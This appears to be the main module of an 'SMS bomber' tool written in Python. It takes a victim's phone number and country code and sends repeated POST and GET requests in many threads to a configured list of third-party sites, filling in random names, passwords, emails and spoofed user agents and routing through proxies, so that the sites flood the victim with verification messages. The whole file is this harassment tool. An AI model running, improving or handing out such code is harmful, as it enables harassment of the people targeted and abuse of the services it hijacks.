#!/bin/env python3
from random import choice
from bomp.core import CORE
from bomp.core import Print
from bomp.core import Initial_print
from threading import Thread
from threading import active_count
import requests
from json import loads
from time import sleep

TIMEOUT = 35
SUCCESS  = 0
FAIL = 0
TOTAL = 0

def _post_(name,url, d, h, p):
    global SUCCESS,FAIL, TOTAL
    try:
        a = requests.post(url,
                data=loads(d),
                headers=loads(h),
                proxies=p,
                timeout=TIMEOUT,
                verify=True)
        if CORE["SITE"]["NAME"][name]["REPLY"] != "":
            if CORE["SITE"]["NAME"][name]["REPLY"] == a.text:
                SUCCESS += 1
            else:
                FAIL += 1
        else:
            SUCCESS += 1
    except:
        FAIL += 1
    Print(SUCCESS,FAIL,SUCCESS+FAIL,TOTAL )

def _get_(name,url):
    global SUCCESS, FAIL, TOTAL
    try:
        a = requests.get(url,timeout=TIMEOUT)
        if CORE["SITE"]["NAME"][name]["REPLY"] != "":
            if CORE["SITE"]["NAME"][name]["REPLY"] == a.text:
                SUCCESS += 1
            else:
                FAIL += 1
        else:
            SUCCESS += 1
    except:
        FAIL += 1
    Print(SUCCESS,FAIL,SUCCESS+FAIL,TOTAL )

def bomp(vict, count, thread, code, proxy , delay):
    global SUCCESS,FAIL,TOTAL
    Initial_print(vict, code, thread, count, delay)
    Initial_print
    TOTAL = count
    while 1:
        site = choice(sorted(CORE["SITE"]["NAME"].keys()))
        url = CORE["SITE"]["NAME"][site]["URL"]
        if not code.startswith("+"):
            if active_count() <= thread:
                if CORE["SITE"]["NAME"][site]["ONLY"] != "91":
                    if CORE["SITE"]["NAME"][site]["METHOD"] == "POST":
                        header = CORE["SITE"]["NAME"][site]["HEADER"].replace("@AGENT",
                                choice(CORE["LIST"]["AGENT"])).replace("@XAGENT",
                                    choice(CORE["LIST"]["XAGENT"]))
                        data = CORE["SITE"]["NAME"][site]["DATA"].replace("@VICT",
                                vict).replace("@NAME",
                                        choice(CORE["LIST"]["NAMES"])).replace("@PASS",
                                            choice(CORE["LIST"]["PASS"])).replace("@MAIL",
                                                choice(CORE["LIST"]["MAILS"])).replace("@CODE",
                                                    code)
                        Thread(target=_post_, args=[site,url,data,header,proxy]).start()
                    else:
                        Thread(target=_get_, args=url.replace("@CODE",code).replace("@VICT", vict))
                else:
                    if CORE["SITE"]["NAME"][site]["METHOD"] == "POST":
                        header = CORE["SITE"]["NAME"][site]["HEADER"].replace("@AGENT",
                                choice(CORE["LIST"]["AGENT"])).replace("@XAGENT",
                                    choice(CORE["LIST"]["XAGENT"]))
                        data = CORE["SITE"]["NAME"][site]["DATA"].replace("@VICT",
                                vict).replace("@NAME",
                                        choice(CORE["LIST"]["NAMES"])).replace("@PASS",
                                            choice(CORE["LIST"]["PASS"])).replace("@MAIL",
                                                choice(CORE["LIST"]["MAILS"])).replace("@CODE",
                                                    code)
                        Thread(target=_post_, args=[site,url,data,header,proxy]).start()
                    else:
                        Thread(target=_get_, args=url.replace("@CODE",code).replace("@VICT", vict))
                if 0 == count:
                    break
                else:
                    count-=1
        else:
            break
        sleep(delay)


